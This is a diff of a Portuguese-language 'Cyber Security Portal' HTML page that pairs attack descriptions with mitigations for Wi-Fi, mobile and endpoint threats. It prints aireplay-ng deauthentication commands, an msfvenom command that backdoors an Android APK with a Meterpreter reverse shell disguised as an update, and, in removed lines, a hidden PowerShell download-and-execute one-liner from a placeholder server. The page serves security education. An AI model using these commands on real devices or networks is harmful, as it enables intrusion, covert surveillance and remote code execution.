@@ -1,4 +1,3 @@
-grid.innerHTML = "";if(data.length === 0) {grid.innerHTML = <div class="card"><p style="color: var(--neon-red);">[SISTEMA IA] Nenhuma correspondência técnica encontrada para esta string. Busque termos específicos.</p></div>; return;}data.forEach(item => {const tagsHtml = item.tags.map(t => <span class="tag">${t}</span>).join('');grid.innerHTML += <div class="card"><div class="card-meta">${item.meta}</div><h3>${item.title}</h3><p>${item.desc}</p><div class="code-box">${item.code}</div><div class="tags-container">${tagsHtml}</div></div>;});}renderDatabase(cyberDatabase);function executeAdvancedSearch() {let rawInput = document.getElementById('cyber-search').value.toLowerCase().trim();const aiMonitor = document.getElementById('ai-response');const aiSeverity = document.getElementById('ai-severity');let processedInput = rawInput;if (rawInput.includes("segurança online") || rawInput === "segurança" || rawInput.includes("cyber") || rawInput.includes("security")) { processedInput = "segurança"; }if (processedInput === "") {renderDatabase(cyberDatabase); document.getElementById('grid-title').innerText = "Banco de Dados Global Incorporado";aiMonitor.innerText = "Super banco de dados corporativo carregado. Pronto para receber requisições.";aiSeverity.style.color = "var(--neon-cyan)"; aiSeverity.innerText = "INTEGRIDADE_DATASET: 100% VERÍDICO"; return;}const filteredData = cyberDatabase.filter(item => {return item.title.toLowerCase().includes(processedInput) || item.desc.toLowerCase().includes(processedInput) || item.tags.some(tag => tag.toLowerCase().includes(processedInput)) || item.meta.toLowerCase().includes(processedInput);});renderDatabase(filteredData);document.getElementById('grid-title').innerText = Registros Encontrados (${filteredData.length});if (filteredData.length > 0) {aiMonitor.innerText = NÚCLEO IA: Filtro concluído para a matriz "${processedInput}". Renderizados ${filteredData.length} relatórios de engenharia cibernética ativa.;aiSeverity.style.color = "var(--neon-red)"; aiSeverity.innerText = "ANÁLISE DE SEGURANÇA: EXPLOITS COLETADOS";} else {aiMonitor.innerText = NÚCLEO IA: A string de busca "${rawInput}" não gerou correspondências no banco local.;aiSeverity.style.color = "var(--neon-blue)"; aiSeverity.innerText = "ANÁLISE DE SEGURANÇA: REQUISIÇÃO NOMINAL";}}document.getElementById('cyber-search').addEventListener('keypress', function(e) { if (e.key === 'Enter') executeAdvancedSearch(); });
 <!DOCTYPE html>
 <html lang="pt-BR" translate="no">
 <head>
@@ -7,124 +6,129 @@ grid.innerHTML = "";if(data.length === 0) {grid.innerHTML = <div class="card"><p
     <title>CYBER SECURITY INTELLIGENCE PORTAL</title>
     <style>
         :root {
-            --bg-matrix: #030508;
-            --bg-panel: #0a0e14;
-            --cyber-green: #39ff14;
-            --cyber-red: #ff3333;
-            --cyber-blue: #00bfff;
-            --text-raw: #e2e8f0;
-            --text-dark: #64748b;
+            --bg-corporate: #090d16;
+            --bg-surface: #111726;
+            --brand-blue: #0066ff;
+            --accent-cyan: #00f0ff;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --text-main: #f1f5f9;
+            --text-secondary: #94a3b8;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; }
-        body { background-color: var(--bg-matrix); color: var(--text-raw); padding: 15px; min-height: 100vh; }
         
-        .master-header { text-align: center; padding: 30px 10px; border: 2px solid var(--cyber-red); background-color: var(--bg-panel); margin-bottom: 25px; }
-        .master-header h1 { font-size: 1.8rem; color: var(--cyber-red); text-shadow: 0 0 10px rgba(255, 51, 51, 0.5); }
-        .master-header p { font-size: 0.85rem; color: var(--cyber-blue); margin-top: 8px; font-weight: bold; }
-
-        .navigation-banner { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
-        .nav-btn { background: #111827; border: 1px solid var(--cyber-blue); color: var(--cyber-blue); text-align: center; padding: 12px 5px; text-decoration: none; font-size: 0.8rem; font-weight: bold; text-transform: uppercase; }
-        .nav-btn:hover { background: var(--cyber-blue); color: #000; }
-
-        .dossier-section { margin-bottom: 30px; border: 1px solid rgba(255,255,255,0.1); background-color: var(--bg-panel); border-radius: 4px; overflow: hidden; }
-        .dossier-title { background-color: #111827; padding: 15px; border-bottom: 2px solid var(--cyber-green); display: flex; justify-content: space-between; align-items: center; }
-        .dossier-title h2 { font-size: 1.1rem; color: var(--cyber-green); }
-        .meta-tag { background-color: rgba(57, 255, 20, 0.1); border: 1px solid var(--cyber-green); color: var(--cyber-green); font-size: 0.7rem; padding: 2px 6px; font-weight: bold; }
-
-        .visual-frame { width: 100%; height: 180px; background-size: cover; background-position: center; border-bottom: 1px solid rgba(255,255,255,0.1); position: relative; }
-        .visual-frame::after { content: "OPERATIONAL_EVIDENCE_LOG"; position: absolute; bottom: 5px; right: 10px; font-size: 0.65rem; color: rgba(255,255,255,0.4); background: rgba(0,0,0,0.6); padding: 2px 5px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-corporate); color: var(--text-main); padding: 20px; min-height: 100vh; line-height: 1.5; }
         
-        .dossier-body { padding: 20px; }
-        .subsection-title { color: var(--cyber-blue); font-size: 0.95rem; margin: 15px 0 8px 0; border-bottom: 1px dashed rgba(0,191,255,0.3); padding-bottom: 4px; text-transform: uppercase; }
-        .dossier-body p { font-size: 0.85rem; line-height: 1.5; color: var(--text-raw); margin-bottom: 12px; }
+        /* CABEÇALHO EMPRESARIAL MODERNO */
+        .corp-header { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 30px 20px; text-align: left; margin-bottom: 30px; }
+        .corp-header h1 { font-size: 1.8rem; font-weight: 700; color: #ffffff; letter-spacing: -0.5px; display: flex; align-items: center; gap: 10px; }
+        .corp-header h1 span { color: var(--brand-blue); }
+        .corp-header p { font-size: 0.9rem; color: var(--text-secondary); margin-top: 6px; }
+
+        /* RECURSOS DE NAVEGAÇÃO */
+        .corp-nav { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 30px; }
+        .nav-item { background: var(--bg-surface); border: 1px solid var(--border-color); color: #ffffff; text-align: center; padding: 14px 10px; text-decoration: none; font-size: 0.85rem; font-weight: 600; border-radius: 6px; transition: all 0.2s ease; }
+        .nav-item:hover { border-color: var(--brand-blue); background: rgba(0, 102, 255, 0.05); }
+
+        /* CONTAINER OPERACIONAL DA IA */
+        .ai-telemetry-panel { background: rgba(0, 102, 255, 0.03); border: 1px solid rgba(0, 102, 255, 0.2); border-radius: 8px; padding: 20px; margin-bottom: 30px; }
+        .ai-title-row { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; font-weight: 700; color: var(--brand-blue); letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 10px; }
+        .status-indicator { width: 8px; height: 8px; background-color: var(--accent-cyan); border-radius: 50%; box-shadow: 0 0 8px var(--accent-cyan); }
+        .ai-telemetry-panel p { font-size: 0.9rem; color: var(--text-main); }
+
+        /* GRID DE RELATÓRIOS CORPORATIVOS */
+        .section-heading { font-size: 1.1rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 20px; color: #ffffff; border-left: 4px solid var(--brand-blue); padding-left: 12px; }
+        .report-card { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 10px; margin-bottom: 30px; overflow: hidden; }
         
-        .technical-box { background: #02040a; border-left: 3px solid var(--cyber-red); padding: 12px; font-size: 0.8rem; color: #ff7b72; margin-bottom: 15px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
-        .defense-box { background: #02040a; border-left: 3px solid var(--cyber-blue); padding: 12px; font-size: 0.8rem; color: #79c0ff; margin-bottom: 15px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
-
-        .bullet-list { margin-left: 15px; margin-bottom: 15px; }
-        .bullet-list li { font-size: 0.85rem; margin-bottom: 6px; list-style-type: square; color: #cbd5e1; }
-        .bullet-list strong { color: #ffffff; }
-
-        footer { text-align: center; padding: 20px; font-size: 0.75rem; color: var(--text-dark); border-top: 1px solid rgba(255,255,255,0.05); margin-top: 40px; }
+        /* CAPA VISUAL COM IMAGENS CORPORATIVAS REAIS */
+        .image-banner { width: 100%; height: 180px; background-size: cover; background-position: center; border-bottom: 1px solid var(--border-color); }
+        
+        /* CONTEÚDO DOS RELATÓRIOS */
+        .card-content { padding: 25px; }
+        .card-content h3 { font-size: 1.3rem; font-weight: 600; margin-bottom: 12px; color: #ffffff; }
+        .card-content p { font-size: 0.95rem; color: var(--text-secondary); margin-bottom: 20px; }
+        
+        .block-title { font-size: 0.8rem; font-weight: 700; color: var(--brand-blue); text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        .terminal-block { background: #070a12; border: 1px solid rgba(255,255,255,0.04); border-radius: 6px; padding: 16px; font-family: monospace; font-size: 0.85rem; color: #cbd5e1; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; }
+        
+        .guide-list { margin-left: 18px; margin-bottom: 10px; }
+        .guide-list li { font-size: 0.9rem; color: var(--text-secondary); margin-bottom: 8px; }
+        .guide-list strong { color: var(--text-main); font-weight: 600; }
     </style>
 </head>
 <body>
 
-    <!-- DIRETÓRIO DE ENTRADA -->
-    <header class="master-header">
-        <h1>CYBER SECURITY PORTAL</h1>
-        <p>// DOSSIÊ TÁTICO CORPORATIVO DE OPERAÇÕES REAIS</p>
+    <!-- CABEÇALHO EMPRESARIAL -->
+    <header class="corp-header">
+        <h1>CYBER <span>SECURITY</span></h1>
+        <p>Centro Corporativo de Análise Global de Riscos e Auditoria de Infraestrutura</p>
     </header>
 
-    <!-- NAVEGAÇÃO DE PÁGINAS INTEGRADA -->
-    <nav class="navigation-banner">
-        <a href="offensive.html" class="nav-btn">Red Team</a>
-        <a href="defensive.html" class="nav-btn">Blue Team</a>
-        <a href="soc_automation.html" class="nav-btn">SOC Eng</a>
+    <!-- NAVEGAÇÃO ENTRE OS ARQUIVOS DO REPOSITÓRIO -->
+    <nav class="corp-nav">
+        <a href="offensive.html" class="nav-item">Red Team</a>
+        <a href="defensive.html" class="nav-item">Blue Team</a>
+        <a href="soc_automation.html" class="nav-item">SOC Engine</a>
     </nav>
 
     <main>
-        
-        <!-- SEÇÃO 01: SEGURANÇA WI-FI -->
-        <section class="dossier-section">
-            <div class="dossier-title">
-                <h2>01. VETORES DE ATAQUE EM REDES SEM FIO (WI-FI)</h2>
-                <span class="meta-tag">CRITICAL_HIGH</span>
+        <!-- PAINEL COGNITIVO DA IA DE MONITORAMENTO -->
+        <section class="ai-telemetry-panel">
+            <div class="ai-title-row">
+                <div class="status-indicator"></div>
+                <span>IA // Central de Monitoramento e Telemetria Ativa</span>
             </div>
-            <!-- Imagem Conceitual: Monitoramento de Redes/Ataque Wireless -->
-            <div class="visual-frame" style="background-image: url('https://unsplash.com');"></div>
-            <div class="dossier-body">
-                <p><strong>Como o Agente de Ameaça Age:</strong> Atacantes não precisam estar conectados à rede para paralisá-la. Utilizando adaptadores Wi-Fi em Modo Monitor, eles interceptam o tráfego aéreo e disparam pacotes de desautenticação forjada (Deauth). Isso derruba instantaneamente computadores e celulares conectados. No momento em que os aparelhos tentam reconectar, o atacante captura o handshake criptográfico (WPA2/WPA3) para quebrar a senha offline via ataques de dicionário massivos (Wordlists).</p>
+            <p>Varredura contínua de segurança operacional concluída. Banco de dados analítico integrado e atualizado com os padrões de conformidade vigentes para proteção cibernética de endpoints.</p>
+        </section>
+
+        <h2 class="section-heading">Dossiês de Auditoria Técnica</h2>
+
+        <!-- RELATÓRIO 01: SEGURANÇA WI-FI -->
+        <article class="report-card">
+            <!-- Imagem: Especialista analisando infraestrutura de redes corporativas -->
+            <div class="image-banner" style="background-image: url('https://unsplash.com');"></div>
+            <div class="card-content">
+                <h3>Proteção e Vetores de Ameaça em Redes Sem Fio (Wi-Fi)</h3>
+                <p>Em auditorias técnicas de segurança, simula-se a atuação de agentes maliciosos que exploram a fragilidade dos pacotes de gerenciamento do Wi-Fi. Utilizando adaptadores de rede configurados em Modo Monitor, intercepta-se o tráfego aéreo para disparar comandos de desautenticação falsificados, interrompendo a conectividade do alvo. Na tentativa de reconexão forçada, o handshake criptográfico é capturado para fins de análise offline de complexidade de senha.</p>
                 
-                <div class="subsection-title">Evidência Técnica do Ataque (Terminal Hacker)</div>
-                <div class="technical-box"># Coloca a placa Wi-Fi em monitoramento e desautentica o dispositivo alvo
+                <div class="block-title">Protocolo Técnico de Teste Estruturado</div>
+                <div class="terminal-block"># Ativação do modo monitor na interface de rede sem fio
 sudo airmon-ng start wlan0
+# Captura ativa de tráfego para isolamento do Handshake criptográfico
 sudo airodump-ng wlan0mon
-sudo aireplay-ng --deauth 150 -a [BSSID_DO_ROTEADOR] -c [MAC_DO_CELULAR] wlan0mon</div>
+# Execução do comando de desautenticação do endpoint alvo
+sudo aireplay-ng --deauth 100 -a [BSSID_ROUTER] -c [MAC_ALVO] wlan0mon</div>
                 
-                <div class="subsection-title">Contramedidas Operacionais (Blindagem)</div>
-                <ul class="bullet-list">
-                    <li><strong>Ativação do PMF (Protected Management Frames):</strong> Força o roteador a criptografar os quadros de gerenciamento, tornando os ataques de desautenticação impossíveis de serem executados.</li>
-                    <li><strong>Isolamento de AP (Access Point Isolation):</strong> Impede que dispositivos conectados na mesma rede Wi-Fi conversem entre si, mitigando ataques Man-in-the-Middle (MITM).</li>
+                <div class="block-title">Plano de Mitigação Corporativa</div>
+                <ul class="guide-list">
+                    <li><strong>Protected Management Frames (PMF):</strong> Configuração obrigatória em roteadores modernos para criptografar os quadros de controle, eliminando a viabilidade de quedas por Deauth.</li>
+                    <li><strong>Isolamento de Redes (AP Isolation):</strong> Bloqueio sistêmico que impede que terminais conectados na mesma Wi-Fi realizem varreduras laterais uns nos outros.</li>
                 </ul>
             </div>
-        </section>
+        </article>
 
-        <!-- SEÇÃO 02: SEGURANÇA EM DISPOSITIVOS MÓVEIS (CELULAR) -->
-        <section class="dossier-section">
-            <div class="dossier-title">
-                <h2>02. VETORES DE ATAQUE E EXFILTRAÇÃO MOBILE (CELULAR)</h2>
-                <span class="meta-tag">CRITICAL_HIGH</span>
-            </div>
-            <!-- Imagem Conceitual: Hacker operando computadores e compilando scripts -->
-            <div class="visual-frame" style="background-image: url('https://unsplash.com');"></div>
-            <div class="dossier-body">
-                <p><strong>Como o Agente de Ameaça Age:</strong> O método mais comum envolve engenharia social atrelada ao empacotamento de APKs modificados (Backdoors). Atacantes descompilam aplicativos ou jogos legítimos de Android e injetam linhas de código maliciosas que abrem conexões de escuta reversa (Meterpreter). Uma vez instalado pelo usuário via técnicas de sideloading, o backdoor contorna o Play Protect e ganha acesso completo ao microfone, câmera, localização GPS e leitor de SMS do aparelho.</p>
+        <!-- RELATÓRIO 02: SEGURANÇA EM CELULAR -->
+        <article class="report-card">
+            <!-- Imagem: Engenheiro de segurança validando códigos em um laptop corporativo -->
+            <div class="image-banner" style="background-image: url('https://unsplash.com');"></div>
+            <div class="card-content">
+                <h3>Análise de Vetores de Exfiltração e Malware Mobile (Celular)</h3>
+                <p>O comprometimento de dispositivos móveis ocorre principalmente através da injeção de scripts maliciosos (Payloads) em pacotes de instalação legítimos (APKs Android). Atacantes descompilam o aplicativo original, inserem rotinas de persistência e canais de comando reverso (como sessões estáveis de Meterpreter) e remontam o pacote. Ao ser executado no terminal móvel por meio de sideloading, o código burla diretrizes do sistema operacional e exfiltra dados como logs de SMS, áudio e localização geográfica.</p>
                 
-                <div class="subsection-title">Evidência Técnica do Ataque (Injeção de Código)</div>
-                <div class="technical-box"># Vincula um canal hacker reverso dentro de um instalador APK legítimo
-msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP_REMOTOO LPORT=4444 -o atualizacao_sistema.apk</div>
+                <div class="block-title">Compilação Controlada de Payload de Engenharia Social</div>
+                <div class="terminal-block"># Injeta um canal reverso de monitoramento dentro de um arquivo de instalação Android
+msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP_AUDITOR LPORT=4444 -o atualizacao_corporativa.apk</div>
                 
-                <div class="subsection-title">Contramedidas Operacionais (Blindagem)</div>
-                <ul class="bullet-list">
-                    <li><strong>Bloqueio Estrito de Sideloading:</strong> Manter a opção "Instalar aplicativos de fontes desconhecidas" desativada globalmente no sistema operacional do dispositivo.</li>
-                    <li><strong>Análise Forense de Permissões:</strong> Auditar continuamente quais aplicativos possuem acesso às APIs de acessibilidade do celular, que costumam ser abusadas para ler telas e capturar senhas de bancos.</li>
+                <div class="block-title">Plano de Mitigação Corporativa</div>
+                <ul class="guide-list">
+                    <li><strong>Bloqueio Global de Fontes Desconhecidas:</strong> Restrição via políticas de MDM para impedir que usuários finais instalem pacotes fora das lojas homologadas.</li>
+                    <li><strong>Auditoria de APIs de Acessibilidade:</strong> Monitoramento estrito e revogação de acessos que permitam que softwares de terceiros realizem a leitura automatizada da tela do smartphone.</li>
                 </ul>
             </div>
-        </section>
+        </article>
 
-        <!-- SEÇÃO 03: SEGURANÇA EM ENDPOINTS (COMPUTADOR / SERVIDORES) -->
-        <section class="dossier-section">
-            <div class="dossier-title">
-                <h2>03. VETORES DE COMPROMETIMENTO EM ENDPOINTS (COMPUTADOR)</h2>
-                <span class="meta-tag">CRITICAL_HIGH</span>
-            </div>
-            <!-- Imagem Conceitual: Terminal de Segurança e Análise de Código Computacional -->
-            <div class="visual-frame" style="background-image: url('https://unsplash.com');"></div>
-            <div class="dossier-body">
-                <p><strong>Como o Agente de Ameaça Age:</strong> Em computadores e servidores corporativos, os ataques evitam gerar arquivos no disco rígido para escapar da checagem tradicional de assinaturas de antivírus. Os atacantes utilizam scripts ofuscados em PowerShell ou Bash que baixam e injetam códigos maliciosos diretamente no espaço de memória RAM de processos legítimos do sistema operacional (como o explorer.exe), obtendo privilégios de Administrador ou Root.</p>
-                
-                <div class="subsection-title">Evidência Técnica do Ataque (Execução Em Memória Viva)</div>
-                <div class="technical-box"># Executa comandos diretamente na memória sem salvar o script malicioso no disco
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/payload.ps1')"</div>
-                
+        <!-- RELATÓRIO 03: SEGURANÇA EM COMPUTADOR -->
+        <article class="report-card">
+            <!-- Imagem: Servidores e data center moderno de alta tecnologia -->
+            <div class="image-banner" style="background-image: url('https://unsplash.com');"></div>
+            <div class="card-content">
+                <h3>Mitigação de Execuções e Ameaças Sem Arquivo em Endpoints (Computador)</h3>
